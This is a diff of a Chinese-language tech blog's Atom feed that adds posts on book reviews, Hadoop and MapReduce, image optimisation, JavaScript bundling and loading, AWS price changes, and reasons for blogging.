@@ -4,7 +4,7 @@
   <title><![CDATA[Hank Lin]]></title>
   <link href="http://hanklin.com/atom.xml" rel="self"/>
   <link href="http://hanklin.com/"/>
-  <updated>2013-02-05T09:16:28+08:00</updated>
+  <updated>2013-03-22T10:47:20+08:00</updated>
   <id>http://hanklin.com/</id>
   <author>
     <name><![CDATA[Hank Lin]]></name>
@@ -138,6 +138,677 @@
 <p>執行<code>rake setup_github_pages</code>用來告訴octopress我們要使用的GitHub的Repository資訊，格式是:<code>git@github.com:your_username/your_projectname</code>。<br />
 <code>rake deploy</code>這個指令就真的會把網頁傳上GitHub了。在這一步我在Windows上又有問題，我用GitHub for Windows的Git Shell去執行這個指令才能傳上GitHub。<br />
 如果是產生第一次的網頁，GitHub可能會10分鐘才初始化好環境。但是初始化好之後，隨時佈署上GitHub，看到的就都是最新的內容。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Jamie流行銷 - 心得]]></title>
+    <link href="http://hanklin.com/blog/2012/04/17/jamie%25e6%25b5%2581%25e8%25a1%258c%25e9%258a%25b7-%25e5%25bf%2583%25e5%25be%2597"/>
+    <updated>2012-04-17T00:09:57+08:00</updated>
+    <id>http://hanklin.com/blog/2012/04/17/jamie%e6%b5%81%e8%a1%8c%e9%8a%b7-%e5%bf%83%e5%be%97</id>
+    <content type="html"><![CDATA[<p><a href="http://www.books.com.tw/exep/prod/booksfile.php?item=0010537656&" target="_blank"><img src="http://mrjamie.cc/wp-content/uploads/2012/03/Jamie_NNM_Cover-381x550.jpg" /></a></p>
+
+<h1>Jamie流行銷</h1>
+
+
+<p>也許你會說：我是專業的軟體工程師，我不需要會行銷。
+這邊的軟體工程師可以換成其它許多工作，都可以通。但是以現在變換速度越來越快的世界，如何把我們的產品/網站/服務做最有效率的改進，這不單是行銷人員的責任。如果是新創公司團隊，可能只有2、3人，每個人如果除了自己的專長之外，對工作夥伴的專業能有多一些的瞭解，可以讓整個合作更流暢，讓產品能更快的進步。當團隊都能認同這個作法，自然工作效率也會比較好，也可以預期，在每個產品循環生命週期，能把產品越改越好。</p>
+
+<h1>你不知道的流行銷</h1>
+
+
+<p>在這本「<a href="http://mrjamie.cc/2012/03/14/new-new-marketing-is-here/" title="Jamie流行銷" target="_blank">Jamie流行銷</a>」，Jamie介紹的是在新新網路世界，如何用科學方法得知「行銷」或是說任何產品的改動，對營收的影響。這是一個精確的科學方法，需要由技術人員支援，所以沒辦法只由行銷人員達成。這是因為我們在這整個改良產品的循環，有很多步驟要記錄。例如：下載app、加入會員、使用產品、付費等等。記錄之後，才能夠作為將來跑產品生命週期循環的數據。
+這也是因為，在新的網路、社群網路、及行動上網，我們有機會能夠精準的得知使用者的行為。也就是說，今天任何一個新的行銷行為，或是對產品做任何更新，我們都有能力知道，這些變化，究竟對最後的營收，有怎麼樣的效果。這是在以前的廣告媒體，不可能做到的精確。現在真實的朋友都在facebook上連結、mobile app使用的人是能追蹤到的真實客戶、網站也很大程度可以個人化，都帶給我們全新的、不同的可能性。例如我們能藉由朋友推薦的病毒行銷，或是個人化的app或網站使用經驗。
+這裡又和Jamie常提到的<a href="http://mrjamie.cc/tag/mvp/" target="_blank">MVP</a>、<a href="http://mrjamie.cc/tag/lean-startup/" target="_blank">Lean startup</a>完全有相關。所以，這裡不單是介紹一個新的行銷概念，網路的創業在整個團隊心態、開發流程、創業思維，都和舊作法有革命性的不同。也就是這整個環境因素都有根本的改變了，所以真的無法再像過去一樣，美術設計歸美術，程式歸程式，行銷推廣歸行銷。而必需有一個「團隊責任」的新概念。</p>
+
+<h1>其實不是教你行銷</h1>
+
+
+<p>因為我們重視的是科學的方法，所以讓客戶來直接告訴我們結果，是最快也最好的。既然是要準確的結果，一次就只能改一個變因，然後再去觀測結果。如果結果是好的，那就繼續下一個測試。如果結果比原本還差，那就馬上改回來。這裡又談到另一個Jamie常講的重點，也就是<a href="http://mrjamie.cc/2011/04/27/ltv-cpa/" target="_blank">LTV > CPA</a>。套在這個「Jamie流行銷」上，就更明顯了。也就是說，如果你的行銷花費，大於營收，(在這裡都用一個客戶的平均值來看)那無論你花多大的力氣去推廣，你的產品還是無法產生正的收益。當然，平平是行銷，處方相同，提煉作法不同，成本效果也不同。所以有的成本低，帶來客量大，但成交少，有的成本高，客量少，但是都成交。要怎麼樣去記錄、分析、判斷，就是又要靠智慧和敏銳的感覺了。
+前面說的是我們不斷改進產品，並以行銷活動測試結果，但是舊的作法，常常是行銷和產品分開，也就是產品作出來了之後，不是用客戶的回饋，去快速的更改產品，而是用不同的行銷活動想辦法賣出去。當然這會有差異，但是效率可能會很差。這讓我想到愛因斯坦的一句話：</p>
+
+<p>The definition of insanity is doing the same thing over and over and expecting different results。</p>
+
+<p>如果這個產品是錯的，那再怎麼樣高明的行銷活動，都無法產生好的結果。所以講到這裡，重點仍然是只有一直不斷的改進產品，找出高轉換率的產品之後，才能在行銷上加大力道。</p>
+
+<h1>只要有心，人人都會行銷</h1>
+
+
+<p>現在是一個需要自我行銷的時代，找工作，提案子，或是平常搞定朋友間出遊的地點等，都有可以參考的地方。這世界正在不斷的改變，而且就和宇宙擴張的速度一樣，還越來越快。現在每一天的新資訊，可能一年都看不完。要如何能夠動作更快，勝過競爭者，勢必要在心態上有徹底的改變，方法上也要更有效率。這不論是行銷人員，或是技術人員都應該精進和學習的。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[超級記憶王 - 心得]]></title>
+    <link href="http://hanklin.com/blog/2012/03/27/memorize"/>
+    <updated>2012-03-27T09:40:35+08:00</updated>
+    <id>http://hanklin.com/blog/2012/03/27/memorize</id>
+    <content type="html"><![CDATA[<h2>需要銀杏嗎</h2>
+
+
+<p>我記得(至少這件事還記得，不錯)，以前看技術的書，雖然不到過目不忘的地步，但是至少我很清楚，要找的時候在哪裡可以找得到。最近這幾年，一直有一個感覺，就是:
+如果你看過的資訊，不記得細節，以至於無法馬上拿來使用，那即使你知道你看過，也沒用，因為沒辦法馬上幫你達成效用。
+即使你花時間去找，最後幸運找到了，花的時間也可能不符合成本。不過我最近常發生的，就是找了半天也找不到，我究竟在哪裡看過這個資訊的。之前花時間看的功夫等於白費了。
+由於我知道人的大腦，能力非常強。經過訓練，可以發揮一般人想像不到的境界。所以我想，在吃銀杏之前，還是先訓練一下自己的腦子吧。所以我前一陣子又買了有關記憶的書，和我以前的習慣一樣，同樣題材的書我會一次買2、3本。這本「超級記憶王」就是我先看的書。</p>
+
+<h2>心中有畫面</h2>
+
+
+<p>我很久以前就知道，記憶是可以訓練的，但是要怎麼訓練? 最重要的就是心中要有畫面，把你想記的東西聯想起來。只要你心中有畫面，就一定不會忘記。這本書的兩個作者，都是從小就愛東想西想。然後漸漸把這一套作法系統化，發展成可以記憶演講內容、數字、人名、臉孔、日期、地圖等等，真的是很厲害。不過由於兩個作者是美國人，所以他們的作法都是完全依賴英文，不是天生說英文的人，可能還要轉一層，會有點慢。這兩個作者從小就有開始訓練這種本事，所以當然他們已經能夠想記什麼就記什麼。所以這不是沒有代價的，對不喜歡動腦的人，就沒辦法了。一但你肯花腦筋把要記的東西連結起來，就能要記多久就記多久。</p>
+
+<h2>訓練再訓練</h2>
+
+
+<p>這本書如果只是看完，而沒有真的去自我訓練的的話，就太可惜了，也沒辦法真的提昇記憶力。不過照著訓練真的是很花腦力的事，原本看過就好變成要「用心」看。但是這樣不就是原本我所希望的嗎? 看過一次，然後不需要回頭找資料，雖然第一次可能會看得久一些。現在我也開始試著記數字，看到路上的車牌、門牌，就想辦法練習。
+所以，開始訓練吧!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[一切從一篇paper開始 - Hadoop]]></title>
+    <link href="http://hanklin.com/blog/2012/03/21/paper-hadoop"/>
+    <updated>2012-03-21T22:13:22+08:00</updated>
+    <id>http://hanklin.com/blog/2012/03/21/paper-hadoop</id>
+    <content type="html"><![CDATA[<h2>下一個AWS</h2>
+
+
+<p>上一場我在精誠資訊的演講，有提到「下一個AWS從何而來」這個議題。我有列出了一些，不過我最有興趣的，還是「大量資料的處理」這一塊。
+就像我在裡面講的，我不認為用小資本就能進入IaaS的市場，賣貨櫃機房更不算得上是雲端運算。那我認為比較有希望的還是在PaaS或SaaS。其中我認為將來最需要的就是「大量資料的處理」(big data processing)、「即時的資料處理」(realtime processing)、以及「資料的視覺化」(data visualization)。因為這些功能都和資料的儲存、使用、形態很緊密結合，所以開發好用的SaaS就是我最感興趣的。</p>
+
+<h2>真實的需求</h2>
+
+
+<p>現在的網路世界，不單是server數量大增，可以上網的裝置也大量增加。以前的電腦還一定要人走過去用才上網，現在手機、平版電腦、販賣機等可以上網的裝置爆增，以後可能所有電子產品都可以上網，簡單到一個插頭都可以回報資料。所以資料量是以等比級數在上昇的，要如何快速、正確的取得我們要的資料，就變成最重要的問題。
+以前有一個名詞叫data porn，形容資料太多，像色情一樣泛濫，不知從何處理起。那可以想像，資料如果用等比級數在增加，這個data porn會越來越難處理。而Hadoop的出現，幫助我們解決一部份的問題。</p>
+
+<h2>一切從一篇paper開始</h2>
+
+
+<p>一般公司要解決大資料的處理，大都是開發程式，用自己的方法去解決資料處理的問題，開發一個應用成本比較高，不易再利用。Google在2004年發表一篇很有名的「<a href="http://research.google.com/archive/mapreduce.html">MapReduce: Simplified Data Processing on Large Clusters</a>」，說明Google如何處理爬回來的網頁，以支援Google的搜尋等服務。特點就在於可以用一套程式設計界面，處理各種問題。寫一個應用時不需要處理分散式的程式設計等問題，重用性較高。可以投入更多機器，讓問題更快解完。而且還有容錯能力，會自動重試失敗的jobs。
+MapReduce這麼神，但是當然Google沒有發表實作細節，許多細節還申請了專利。其它人想用MapReduce怎麼辦?</p>
+
+<h2>黃色大象Hadoop</h2>
+
+
+<p>另一個大師，Doug Cutting，為了支援Nutch，又建立了Hadoop這個專案。以模擬MapReduce的樣子，做出這個分散式資料處理的框架。因為是free open source，所以被許多公司拿來用。現在Yahoo!是最大的操作者，單一cluster有到4,000個節點。Facebook、Amazon、Apple、eBay、Microsoft、IBM、HP等等大公司也用Hadoop來處理大量資料。所以就像我前面說的，隨著資料越來越多，增長得越來越快，Hadoop(或大量處理資料的工具)就會越來越重要。投資在Hadoop上，似乎是下一個最被關注的課題。
+當然，除了Hadoop，還有許多的類MapReduce的資料處理框架，只是Hadoop是比較多人在用的。</p>
+
+<p>這個星期五(3月23日)，我在精誠資訊分享第2場「<a href="http://www.facebook.com/events/207058829394087/">向成功的雲服務學習</a>」，歡迎你。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[網站小圖檔的規範(1)]]></title>
+    <link href="http://hanklin.com/blog/2012/03/15/image-optimize-1"/>
+    <updated>2012-03-15T10:13:43+08:00</updated>
+    <id>http://hanklin.com/blog/2012/03/15/image-optimize-1</id>
+    <content type="html"><![CDATA[<h2>令人又愛又恨的小圖檔</h2>
+
+
+<p>小圖檔在網站上，扮演一個很重要的角色。即使是像我這個懶得放圖的blog，還是得有favicon小圖示，按鈕、上一頁/下一頁的小圖示等。一般的商業網站更是需要大量的圖。這些圖的請求量通常很驚人，所以怎麼優化就變得很重要了。
+根據Yahoo!的研究(http://www.yuiblog.com/blog/2008/10/29/imageopt-1/)，圖的請求量(總bytes數)，平均約佔總傳輸量的46.6%。當然每個網站都不相同，但是這個平均數也太驚人了。如果可以減少圖的負擔，網頁可以讀取得更快，伺服器也可以服務更多的使用者，頻寬費也可以降低。所以要做一個高品質的網站，圖的規範最好從一開始就建立好。</p>
+
+<h2>縮小圖檔的大小</h2>
+
+
+<p>優化圖檔有許多作法，其中一個最簡單的作法就是：縮小圖檔的大小(bytes數)。
+一般設計師輸出的圖，常常存了許多不必要的資訊(metadata)，在網站顯示這些圖檔是完全不需要這些資訊的，把它們去除通常可以減少檔案大小。唯一要注意的就是有版權的圖是不能這樣作的，除非你有這張圖的版權。另外可以做的就是優化壓縮的效率，而不至於損失圖像的資訊(lossless)。可以縮小圖檔大小的工具有很多，我們可以只看一些免費的工具。</p>
+
+<ul>
+  <li><a href="http://www.imagemagick.org/">imagemagick</a>: 萬用的圖像工具</li>
+  <li><a href="http://optipng.sourceforge.net/">OptiPNG</a>: 專門處理png的工具</li>
+  <li><a href="http://pmt.sourceforge.net/pngcrush/">PNGCrush</a>: 專門處理png的工具</li>
+  <li><a href="http://psydk.org/PngOptimizer.php">PngOptimizer</a>: 專門處理png的工具</li>
+  <li><a href="http://advsys.net/ken/utils.htm">PngOut</a>: 專門處理png的工具</li>
+  <li><a href="http://advancemame.sourceforge.net/comp-readme.html">AdvanceCOMP</a>: 專門處理png的工具</li>
+  <li><a href="http://www.walbeehm.com/download/">DeflOpt</a>: 專門處理png的工具</li>
+  <li><a href="http://pngquant.org/">PngQuant</a>: 把png24轉成png8的工具</li>
+  <li><a href="http://pngnq.sourceforge.net/">Pngnq</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://pornel.net/pngnq">Improved Pngnq</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://entropymine.com/imageworsener/">ImageWorsener</a>:  把png24轉成png8的工具</li>
+  <li><a href="http://jpegclub.org/">JPEGTran</a>: 專門處理jpeg的工具</li>
+  <li><a href="http://www.lcdf.org/gifsicle/">Gifsicle</a>: 專門處理動畫gif的工具 </li>
+</ul>
+
+
+<p>可以用的工具不少，每一種工具對不同的圖，處理完的大小還可能有不小的差異。但是要對每個圖試用每一個工具，拿最小的來使用，會太花時間。所以只要選一個自己覺得好用的來用就可以了。
+據我的經驗，jpeg最多可以減少20%的大小，png則可以減少10%的大小。</p>
+
+<h2>處理圖檔的原則</h2>
+
+
+<ul>
+  <li>圖的尺寸較小、但要有清析的邊緣，例如小圖示，使用png。缺點是使用png8時，顏色受到限制，用png24在大圖的檔案大小又會太大。</li>
+  <li>圖的尺寸較大、顏色要鮮明，例如照片，使用jpeg。缺點是高對比的邊緣和大色塊會模糊</li>
+  <li>可以的話，把所有gif轉成png8(除了動畫gif)，或是一開始就規定不要使用gif。</li>
+  <li>動畫gif的數目也要儘量減少，有的話，使用工具去縮小</li>
+  <li>用工具對所有png圖檔執行縮小的步驟</li>
+  <li>用工具對所有jpeg圖檔執行縮小的步驟</li>
+</ul>
+
+
+
+
+<h2>壓縮</h2>
+
+
+<p>許多網站伺服器，如Apache, 或是應用程式框架，都有動態壓縮輸出內容的功能，可以很簡單的設定那些輸出是要壓縮的。由於常用的圖檔格式: jpeg、png、gif都是已經壓縮過的，再經過壓縮程序常常多花時間、花記憶體、花CPU，但常常壓出來的東西反而還更大，所以這些圖都記得絕不要設定壓縮。</p>
+
+<h2>favicon</h2>
+
+
+<p>一定要記得在你的網站放favicon，而且favicon最好不要太大，最好小於1KB。有的favicon檔案包含了各種大小的圖檔，所以就會太大。可以的話，使用16色palette png就好了。動畫gif的favicon是完全不必要的，要避免(但是動態更換favicon倒是在一些場合很有用)。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[nuance]]></title>
+    <link href="http://hanklin.com/blog/2012/01/11/nuance"/>
+    <updated>2012-01-11T21:15:58+08:00</updated>
+    <id>http://hanklin.com/blog/2012/01/11/nuance</id>
+    <content type="html"><![CDATA[<p>很久以前看英文的技術書時學到「nuance」這個字，查字典的解釋是「細微的差別」，例如音調、顏色、見解等細節的不同。</p>
+
+<p>我喜歡這個字，是因為這個字代表每個個體的獨特性。以音樂來說，貝多芬的第九號交響曲的樂譜只有一種，但是不同的交響樂團，不同的指揮家，甚至不同的音樂廳，演奏出來的感覺都不同。而這些不同的版本就有個人喜好、意境的不同。節拍快0.1秒、音符修飾的1/100差異等等，這些用科學統計方法來看，不具顯著性的差異，但是卻能表現出不同的風格。例如福特萬格勒在拜魯特的貝九就被視為是經典詮釋。</p>
+
+<p>有的指揮家認為，要完全遵照作曲家在樂譜上的指示，忠實的呈現出來，貫徹作曲家的意志。但有的指揮家覺得，樂譜有其表達力的限制，應該要適時揉合作曲家的作曲背景，並由指揮/演奏去詮釋作品。但不論是哪一種，都要有一定的能力才能達到。</p>
+
+<p>我是Leica M相機的愛好者，這款高品質的德國相機，堅固耐用，功能非常少，他僅有的功能都是讓你能專注在「拍照」這件事上。用Leica M拍出來的照片，優異的暗部細節和寫實性，讓我非常的喜愛。看習慣用Leica M拍的照片之後，看一般的照片就會覺得「少了很多細節」。有些人看不出細節差異，但是我剛好是看得出來的那種。</p>
+
+<p>回到軟體開發上面，「nuance」這個字就更重要了。軟體開發雖然是一種「創作」，但是本質上和「演奏」比較像。演奏要以「樂譜」為本，加上演奏者的詮釋。而軟體開發也是有一個目標，例如「需求」，再由開發者去詮釋。但是這個目標不像樂譜，有非常明確的規範，所以開發者能夠發揮的空間非常的大。就算再詳細的設計文件，在真正實作時，還是有一大段空間要填滿。</p>
+
+<p>例如，我想做一個線上購物網站，這是目標，但是在作出來之前，沒有人知道這個網站將來會長什麼樣。就算網頁看起來一模一樣好了，也許背後用的技術完全不同，也許scalability不同，也許performance不同，也許cost不同。而這一切一切的不同，就是由許多開發時的選擇累積出來的。這些自由選擇(詮釋方式)，就是我所說的軟體nuance。</p>
+
+<p>所以，軟體的開發者、設計者、架構者所作的大大小小的選擇，也就決定了這個系統的個性。和音樂一樣，在達到一定水準之後，沒有絕對的對錯，就只有「品味」(或喜好)的問題了。例如：貝九我可能比較喜歡卡拉揚的版本。</p>
+
+<p>對軟體工程師來說，要有能力控制nuance，就必需要不斷增加見識廣度和技術深度，也要保持一顆熱情開放的心，願意嘗試新的東西，不能習慣於過去的作法。我的經驗是，我以為我已經看得夠廣夠深了，在和不同領域的人談過之後，我才發現自己看得太少了。同時，也要能培養出辨別「nuance」的能力，要知道作這個選擇會有什麼影響。</p>
+
+<p>品質，是由許多小細節累積而成的，讓我們一起勉勵！</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[JavaScript的處理方式]]></title>
+    <link href="http://hanklin.com/blog/2011/11/03/javascript-1"/>
+    <updated>2011-11-03T21:04:36+08:00</updated>
+    <id>http://hanklin.com/blog/2011/11/03/javascript-1</id>
+    <content type="html"><![CDATA[<p>每個原始檔要先最小化，然後依照引用的順序合併。檔名可以在佈署時動態產生，常用的選擇有亂數、佈署版本的號碼或名稱、最後修改的檔案時間戳記、或可閱讀的曰期時間字串。</p>
+
+<p>每個頁面所引用的JavaScript檔，組合會有很多種。所以對整個網站考量時，就有幾種合併的作法，以下是比較常用的。</p>
+
+<ul>
+  <li><h4>整個網站用到的所有JavaScript，都合併成一個檔案</h4>
+    適合所有頁面引用的JavaScript，組合並不多時。並且引用的順序都一樣，也就是順序不影響的時候。這種作法當然網站速度最快，但是常常每個頁面引用的JavaScript，都有不同。而且有些JavaScript檔案，只在一、二個網頁被引用到，這個比例高的話，就變成每一頁都還要引用原本只需要在那一個網頁要讀取的JavaScript。有一些這類的JavaScript函式庫還滿大的，例如所見即所得編輯器(WYSIWYG)，所以實務上不見得是最適合的作法。
+  </li>
+  <li><h4>將所有頁面，或是超過一半的頁面，都有引用到的JavaScript，合併成一個檔案</h4>
+    這個JavaScript會被全部的網頁所引用，然後每個網頁再各自去合併自已的專屬JavaScript檔案。也就是變成一個是整個網站都用到的合併檔，另一個是這個網頁用到的合併檔。這樣的作法，會減少單一頁面的傳輸量，不至於包含了過多沒有用到的JavaScript檔案，但是至少會有兩次的JavaScript請求。適合每個網頁所引用的JavaScript很分歧，而且檔案又不算小的時候。這也是一般常見的情況。
+  </li>
+  <li><h4>每一個網頁各自合併自己引用的檔案</h4>
+    這樣每個網頁只會有一個JavaScript請求，而且不會有多餘的內容，也容許相同組合的JavaScript以不同順序引用。缺點就是你可能需要把JavaScript合併成多種組合，最多到和網頁數一樣多。如果在各網頁間，引用相同的JavaScrip檔案數量很少時，就適合用這個作法。其實這個作法不用管理&#8221;共同的&#8221;及&#8221;各別的&#8221;JavaScript檔案，是我比較喜歡的作法。
+  </li>
+</ul>
+
+
+<p>合併完成後，再來就是要最小化（minify）。JavaScript很適合最小化，可以用語法解析器（parser）檢查，並把不需要的空白去掉。例如使用rhino、jslint。</p>
+
+<p>在合併完後，尤其是最小化之後，JavaScript原始檔會變得完全不能由人去編輯，所以合併及最小化的工作必須在佈署時期，由工具幫我們作。最好是命令列的工具，可以整合進專案的自動管理流程。
+如果原本的一個JavaScript檔案，被合併到多個合併後的檔案。那麼，即使你只改了原始檔的一個字，所有合併後的檔案，都要重新產生，使用者也應該重新下載。 這裡可能有二個問題：</p>
+
+<ul>
+  <li>我們有設定快取標頭，如何通知使用者(瀏覽器)下載新的合併檔？
+  </li>
+  <li>只改一個檔案的一個字，就要使用者重新下載合併的檔案，會不會影響速度？
+  </li>
+</ul>
+
+
+<p>第一個問題，只要改變下載合併檔的URL，下次使用者到這個網頁，就會重新下載這個合併檔。麻煩的地方在於，我們要把所有修改過的合併檔，傳到伺服器上。也就是說，一定要再走一次佈署流程，把所有合併檔都產生好，再佈署上去，即使有工具幫我們作，負擔也是不小，過程也很多地方可能會出錯。所以使用「lazy initialization」，在伺服器端作「合併」、「最小化」的工作，也是一個不錯的方法。
+第二個問題，我認為影響不大。因為我們的目標是，即使客戶端完全沒有快取，也要能很快的顯示網頁。以每一個網頁只使用一到兩個<code><script></code>元素來看，負擔很小。這也可以說是，因為我們把請求數目大量的減少，所以不用太擔心快取的問題。</p>
+
+<p>進行好合併、最小化之後，其它的工作就比較簡單了。也就是在網站伺服器上，對JavaScript檔案進行壓縮及設定快取標頭，把JavaScript的下載最佳化。</p>
+
+<p>JavaScript檔案和區塊，都應該放在HTML文件的最後面。例如我的習慣，是像這樣子：</p>
+
+<pre><code>
+<html>
+  <head></head>
+  <body>
+ 
+    ......
+  
+    <script src="combined.js"></script>
+    <script>
+      $(function() {
+        init(); 
+      });
+    </script>
+  </body>
+</html>
+</code></pre>
+
+
+<p>我們常常需要在我們的網站上，引用第三方的JavaScript函式庫，如社羣網站API、測量工具、或廣告商等。以前通常會對放置JavaScript的區塊作限制，甚至要求要用document.write()的語法，對我們網站的效能造成嚴重的限制。我真的不希望使用者看我的網頁，要先等廣告render好，才出現真正的內容。尤其是JavaScript的請求會擋住(block)網頁的render，如果第三方的網站回應較慢，還會連累我們的網站，讓使用者等半天，只看到白畫面。
+還好，現在比較大的第三方JavaScript函式庫，都支援了非同步的JavaScript使用法。所以我們也要把這些JavaScript，在HTML文件和資源都準備好(onload)之後，再去呼叫初始化。初始化的步驟通常是用JavaScript插入一段引用第三方JavaScript函式庫的<script>元素，然後傳入必要的參數。</p>
+
+<p>現在非同步的JavaScript函式庫的支援很常見，所以一定要用這個方法去引用。如果你要用的函式庫，沒有支援非同步的使用法，那我建議考慮別家，有支援非同步的函式庫。</p>
+
+<p>另外應該避免的作法，就是使用「inline」的JavaScript，或是說<script>區塊。所謂的「inline」，就是直接寫在HTML裡的<script>元素，例如：</p>
+
+<pre><code>
+<div>
+  <script>
+    alert("!"); 
+  </script>
+  <img src="what.png" />
+</div>
+</code></pre>
+
+
+<p>inline又分成兩種，一種是寫在靜態HTML裡，如果量不多倒是還好。另一種是隨著伺服器端腳本（server side script）或範本（template）工具動態產生的HTML寫出去的。</p>
+
+<p>這兩種作法都會造成許多管理、開發、和優化的麻煩，所以要從一開始就要儘量避免。</p>
+
+<p>如果要最小化這些源始碼，必須先把inline的一段段<script>的內容拿出來，進行最小化處理之後，再塞回原本的地方。這個過程很囉嗦，也很容易出錯。</p>
+
+<p>然而，還有一種寫法比inline更糟，那就是用伺服器端腳本或範本工具，動態產生JavaScript區塊，例如：</p>
+
+<pre><code>
+<script>
+  alert("Hello, <%=userName%>"); 
+</script>
+</code></pre>
+
+
+<p>這種程式碼是很難進行自動化優化的，而且維護成本非常高，無論如何你都應該避免這種寫法。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[blue pill or red pill?]]></title>
+    <link href="http://hanklin.com/blog/2011/10/27/blue-pill-or-red-pill"/>
+    <updated>2011-10-27T20:34:02+08:00</updated>
+    <id>http://hanklin.com/blog/2011/10/27/blue-pill-or-red-pill</id>
+    <content type="html"><![CDATA[<p>真的很久沒更新了。
+標題又是用The Matrix裡的梗，可是圖都有版權的，不能用。
+工作繁重不能當作藉囗，有辦法的人還是能有規律的產出新内容。像<a href="http://mrjamie.cc/">Jamie Lin</a>，現在每天一篇啊，會不會太厲害了一點。</p>
+
+<p>要寫blog，就像駭客任務裡的莫非斯給你的選擇。你可以選擇藍色藥丸，繼續過習慣的生活。或是選擇紅色藥丸，很辛苦地試著對生活進行革命。Your choice。</p>
+
+<p>沒錯，革命哪有不辛苦的。寫第一本書的時候，我採用硬撐的方式。把睡覺時間拿來寫稿，沒錯，結果是出來了，但是畢竟不是長久之計。身為<a href="http://mrjamie.cc/2011/05/14/hack-everything/">hack everything</a>的人，不能繼續這樣作。</p>
+
+<p>所以，要工作、要休息、要看資料，要陪家人，還要寫作，這到底要怎麼作到？別急，我也在試，總會有辦法的。</p>
+
+<p>總之，是到了繼續的時候了。和之前說的一樣，我會把新書的內容，用<a href="http://hanklin.com/">blog</a>的形式發表。每一篇都可能不完整、沒有前後文、鬼打牆、或是不通順，都是屬於正常現象，請小心服用。</p>
+
+<p>除了原稿，我還必需建立幾個open source的專案，作為工具和framework。所以真的是大工程，有點像挖坑給自己跳。的確，追求完美的性格又發作了。</p>
+
+<p>對我要寫的內容有任何疑問和建議，都可以提出來，我會參考。但是不一定有時間回應，因為我要繼續前進。發表過的內容也可能重新改寫，所以如果你覺得這篇和你之前看的不同，就忘了過去吧，現在的比較重要。</p>
+
+<p>又到了最難的結尾了，這裡有一個<a href="http://www.facebook.com/hank.web">facebook自high粉絲頁</a>好少人的，有需要就按這個讚(遞)。&lt;fb:like href=&#8221;http://www.facebook.com/hank.web&#8221; send=&#8221;false&#8221; layout=&#8221;button_count&#8221; width=&#8221;450&#8221; show_faces=&#8221;true&#8221;>&lt;/fb:like></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[AWS updates 2011-07]]></title>
+    <link href="http://hanklin.com/blog/2011/07/12/aws-updates-2011-07"/>
+    <updated>2011-07-12T11:43:11+08:00</updated>
+    <id>http://hanklin.com/blog/2011/07/12/aws-updates-2011-07</id>
+    <content type="html"><![CDATA[<p>上天是公平的, 每個人每天只有24小時. 所以如果你不是萬中選一的練武奇才, 那就要比別人多花點時間了. 請容我先用最近的AWS新聞來更新一下blog. 好啦, 因為確實不是新聞了, 所以標題改叫updates&#8230;</p>
+
+<h2>AWS Import/Export for EBS</h2>
+
+
+<p>這個Import/Export的功能可能在北美洲比較有用, 因為是寄硬碟去給Amazon, 讓Amazon依你的指示把資料從S3寫到硬碟或是相反方向. 如果要輸入/輸出大量資料, 例如幾TB, 絕對是用這個方法比較快. 現在EBS也支援AWS Import/Export了, 可以直接作成EBS snapshots, 這樣要複製多份EBS volumes就非常簡單了.</p>
+
+<h2>AWS再降價</h2>
+
+
+<p>是的, AWS又降價了. 這次是很重要的網路傳輸費, 從2011-07-01開始生效. 而且Amazon很康慨的把傳入AWS的費用全免了, 這樣計算網路傳輸費用也很簡單了. 很明顯, Amazon就是希望你把資料全部放到他家裡去. 這個用意再明顯也不過了, 資料一進去, 要出來就難了, 因為最難搬動的就是資料啊. 好了, 傳入全免費了, 那傳出的費用也降了. 以最貴的Tokyo地區來算, 每個月前10TB是每GB $0.201美金. 所以如果你的網站每個月輸出100GB, 那就是$20.1美金. 超大量的流量(每個月524TB以上)還可以和Amazon商量, 拿特別的折扣.
+另一個和網路傳輸費最相關的服務, 就是CloudFront, 也一起降價了. 同樣以最貴的日本地區來看, 每個月前10TB的傳出費用也是降到每GB $0.201美金. 而且流量越大, 每GB的花費比AWS其它服務的網路傳輸費還便宜. 另外CloudFront也有Reserved Capacity Pricing, 和EC2 reserved instances概念類似, 也是先付年費, 就可以有較大的折扣. 不過要直接和Amazon聯絡, 而且每個月流量至少要10TB.</p>
+
+<p>預告: 之後應該會開始把Hadoop的資料整理上來.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Why Blogging]]></title>
+    <link href="http://hanklin.com/blog/2011/06/15/why-blogging"/>
+    <updated>2011-06-15T20:51:17+08:00</updated>
+    <id>http://hanklin.com/blog/2011/06/15/why-blogging</id>
+    <content type="html"><![CDATA[<p>常常沒有人問我, 為什麼要寫blog? (沒錯, 是&#8221;沒有人&#8221;, 這句只是為了學各大blogger常見的開頭&#8230;)
+請看Jamie的: <a href="http://mrjamie.cc/2011/03/30/start-blogging-now/">你必須開一個網誌，現在</a>. 其實最早也是Jamie鼓勵我寫blog的, 我常常說, 沒有Jamie, 就沒有這個blog, 也沒有出書, 也沒有今天的我.</p>
+
+<p>在這裡說的blog, 不是給自己和認識的人看的, 而是為了這個世界創造更多的價值, 不論是自己, 讀者, 或整個與你相關的環境. 像我是軟體工程師, 我可以把我的經驗分享出來, 讓有需要的人, 可以很快的找到方向. 這樣一來, 不但為別人創造了價值, 我自己也增加了無型的價值. 所以, 各行各業都可以寫blog, 不論目的是什麼, 你都可以造成一些影響. 這在網路還沒發達之前是不可能的事, 如果你對現在的媒體很不滿, 那網路就是你最好的發聲管道. 我要很明確的告訴你, 寫blog絕不是一件簡單的事. 如果沒有決心, 那就把它當成休閒就好, 不要期望寫blog能帶給你什麼額外的回饋. 每天上班就已經快累死了, 回到家只想休息啊. 生活上還有很多雜事要處理: 帳單還沒付, 電腦壞了要修, 車子要檢查. 即使是有空的時間, 我也可能和人吵架影響心情, 生病看醫生, 很多文件/書要看, 要靜下心來整理資料寫一篇有內容的文章還真是難啊!</p>
+
